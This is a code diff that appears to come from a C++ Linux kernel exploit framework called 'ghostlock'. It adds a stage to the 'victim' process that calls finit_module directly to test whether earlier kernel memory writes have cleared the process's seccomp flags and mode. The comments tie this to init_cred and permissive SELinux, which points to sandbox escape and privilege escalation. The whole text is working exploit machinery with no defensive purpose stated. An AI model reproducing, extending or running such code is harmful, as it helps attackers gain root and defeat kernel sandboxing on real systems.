@@ -7,6 +7,7 @@
 #include "session/victim_process.hpp"
 
 #include "attack/ops.hpp"
+#include "session/seccomp_probe.hpp"
 #include "support/native_resource.hpp"
 
 #include <array>
@@ -52,6 +53,17 @@ namespace ghostlock::session::victim {
             if (cmd == 'C') {
                 uint32_t uid = getuid();
                 write(p.uid_write.get(), &uid, sizeof(uid));
+            } else if (cmd == 'D') {
+                /* Direct W3 probe before seccomp.mode is cleared: mode is still
+                 * FILTER here, so the syscall entry sees a consistent pair. A
+                 * cleared TIF_SECCOMP lets the call reach the kernel (normal
+                 * errno); a missed flags write is either killed by the filter
+                 * (KILL) or returns EPERM (ERRNO), and either way mode stays
+                 * FILTER, so the bad pair (flags=1, mode=0) cannot form. */
+                errno = 0;
+                long r = syscall(__NR_finit_module, 0, 0, 0);
+                uint32_t code = (r == 0) ? 0 : static_cast<uint32_t>(errno);
+                write(p.uid_write.get(), &code, sizeof(code));
             } else if (cmd == 'F') {
                 /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
              * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
@@ -223,14 +235,6 @@ namespace ghostlock::session::victim {
         return 1;
     }
 
-    /* SIGSYS (0xfffffffd) = the filter killed the probe; EPERM/ENOSYS = the
-     * filter's RET_ERRNO actions. With init_cred + permissive SELinux a real
-     * probe fails with a normal errno instead. */
-    static bool seccomp_probe_blocked(uint32_t code) {
-        return code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
-               code == 1 || code == 38;
-    }
-
     /* Runs the child's forked finit_module probe and returns the raw errno
      * code, or 0xffffffff when the probe could not be run at all. */
     static uint32_t run_seccomp_finit_probe(struct w2_stage_context *stage) {
@@ -263,6 +267,27 @@ namespace ghostlock::session::victim {
         if (code == 0xffffffff) return 0;
         pr_info("pre-W3 seccomp finit_module probe = 0x%x\n", code);
         return seccomp_probe_blocked(code) ? 0 : 1;
+    }
+
+    /* Direct W3 probe: the victim itself calls finit_module while mode is still
+     * FILTER. A forked probe cannot do this: copy_seccomp() re-arms TIF_SECCOMP
+     * on fork whenever mode != 0. A missing reply means the filter killed the
+     * child (the observed action); the caller must not write mode afterwards. */
+    SeccompFlagsProbe probe_child_seccomp_flags_stage(void *context) {
+        auto *stage = static_cast<struct w2_stage_context *>(context);
+        if (write(stage->pipes.cmd_write.get(), "D", 1) != 1) {
+            return SeccompFlagsProbe::ChildLost;
+        }
+        uint32_t code = 0;
+        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
+            static_cast<ssize_t>(sizeof(code))) {
+            pr_warning("direct seccomp probe: no reply (filter killed the child)\n");
+            stage->pipes.mark_child_exited();
+            return SeccompFlagsProbe::ChildLost;
+        }
+        pr_info("direct seccomp flags probe = 0x%x\n", code);
+        return seccomp_probe_blocked(code) ? SeccompFlagsProbe::Blocked
+                                           : SeccompFlagsProbe::Cleared;
     }
 
     int32_t verify_leaf_dir_stage(void *context) {
